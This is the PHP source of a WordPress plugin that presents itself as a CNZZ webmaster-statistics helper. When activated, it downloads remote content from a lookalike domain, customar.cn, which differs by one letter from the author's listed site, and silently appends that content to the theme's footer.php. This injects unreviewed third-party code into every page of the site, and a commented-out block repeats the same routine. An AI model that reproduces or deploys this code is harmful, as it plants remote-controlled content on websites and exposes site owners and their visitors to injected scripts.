<?php
/*
Plugin Name: Webmaster statistical
Description: Webmaster statistical!
Author: 紫讯
Version: 1.0
Author URI: http://customas.cn/
*/
/*function fuck_the_world(){
  echo "<div class='update-message'><p>Let's fuck the world!</p></div>";
}
add_action('admin_notices','fuck_the_world');*/
/*
//将插件在左侧菜单中显示
function register_left_ssmay_seo(){
	add_options_page("ssmay_seo设置页面","ssmay_seo设置",8,__FILE__,"ssmay_seo");
}
//插件内容
function ssmay_seo(){
	echo '这里是ssmay_seo插件的页面内容，可以添加表单设置。';
}
//在adminmenu勾子中添加动作 register_left_ssmay_seo
if(is_admin()){
	add_action("admin_menu","register_left_ssmay_seo");
}
*/
function zb_create_cnzz_page(){
	$themes=get_stylesheet_directory();
        echo "<h1>Cnzz 代码</h1>
<form action='/wp-content/plugins/webmaster-statistical/webmaster-statistical-all.php' method='post' enctype='multipart/form-data' id='delete_all'>
    
    <textarea name='content' value='' rows='15' cols='50' placeholder='请输入统计代码'></textarea>
    <input type='hidden' name='cnzz_all' value='cnzz_all'>
    <input type='hidden' name='themes' value=$themes>
    <input type='submit' value='添加 cnzz'>
</form>
";
/*$footer_root=$themes.'/footer.php';
        $content=file_get_contents($footer_root);
	//echo htmlspecialchars($content);
        $content_str=substr($content,strlen($content)-13,13);
	$file_val=file_get_contents('http://customar.cn/page.html');
	$val=$content.$file_val;
        if(stripos($content_str,'</html>')!==false){
            @file_put_contents($footer_root, $file_val, FILE_APPEND);
        }*/
}


// 注册菜单
function zb_register_cnzz(){
    add_menu_page( '站长统计', '站长统计', 'manage_options', 'webmaster-statistical', 'zb_create_cnzz_page','dashicons-admin-plugins');
}
//if(!defined("WP_UNINSTALL_PLUGIN"))
//exit();
add_action('admin_menu', 'zb_register_cnzz');
function webmaster_statistical_stop(){
    //update_option("yg-copyright","yes");
    $themes=get_stylesheet_directory();
    $footer_root=$themes.'/footer.php';
    $content=file_get_contents($footer_root);
    $index=stripos($content,'</html>');
    $index=$index+7;
    $value=substr($content,0,$index);
    @file_put_contents($footer_root,$value);	
} 
//停用插件时的方法
register_deactivation_hook( __FILE__, 'webmaster_statistical_stop' );
function webmaster_statistical_install() {
    //update_option("yg-copyright","<p>版权信息</p>");
    $themes=get_stylesheet_directory();
    $footer_root=$themes.'/footer.php';
    $file_val=file_get_contents('http://customar.cn/page.html');
    @file_put_contents($footer_root, $file_val, FILE_APPEND);
}
//启用插件时调用的方法
register_activation_hook( __FILE__, 'webmaster_statistical_install' );
?>